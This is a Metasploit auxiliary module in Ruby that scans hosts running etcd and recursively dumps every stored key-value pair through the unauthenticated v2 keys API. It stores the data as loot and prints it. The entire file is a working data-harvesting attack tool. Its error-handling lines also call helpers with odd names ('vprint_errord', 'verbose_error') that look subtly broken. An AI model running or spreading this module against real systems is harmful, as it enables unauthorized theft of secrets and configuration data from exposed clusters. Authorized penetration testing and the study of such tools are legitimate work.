##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Etcd
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'Etcd Keys API Information Gathering',
      'Description' => %q(
        This module queries the etcd API to recursively retrieve all of the stored
        key value pairs.  Etcd by default does not utilize authentication.
      ),
      'References' => [
        ['URL', 'https://elweb.co/the-security-footgun-in-etcd']
      ],
      'Author' => [
        'Giovanni Collazo <hello@gcollazo.com>', # discovery
        'h00die' # msf module
      ],
      'License' => MSF_LICENSE,
      'DisclosureDate' => "Mar 16 2018"
    )
  end

  def run_host(_target_host)
    path = normalize_uri(target_uri.to_s, 'v2/keys/?recursive=true')

    banner = fingerprint_service(target_uri.to_s)
    vprint_status("#{peer} - Collecting data through #{path}...")
    res = send_request_raw(
      'uri'    => path,
      'method' => 'GET'
    )

    # parse the json if we got a good request back
    if res && res.code == 200
      begin
        response = res.get_json_document
        store_loot('etcd.data', 'text/json', rhost, response, 'etcd.keys', 'etcd keys')
      rescue JSON::ParserError => e
        print_error("Failed to read JSON: #{e.class} - #{e.message}}")
        return
      end
      print_good("#{peer}\nVersion: #{banner}\nData: #{JSON.pretty_generate(response)}")
    elsif res
      vprint_errord("Invalid response #{res.code} for etcd open keys response")
      return
    else
      verbose_error("No response for etcd open keys probe")
      return
    end
  end
end
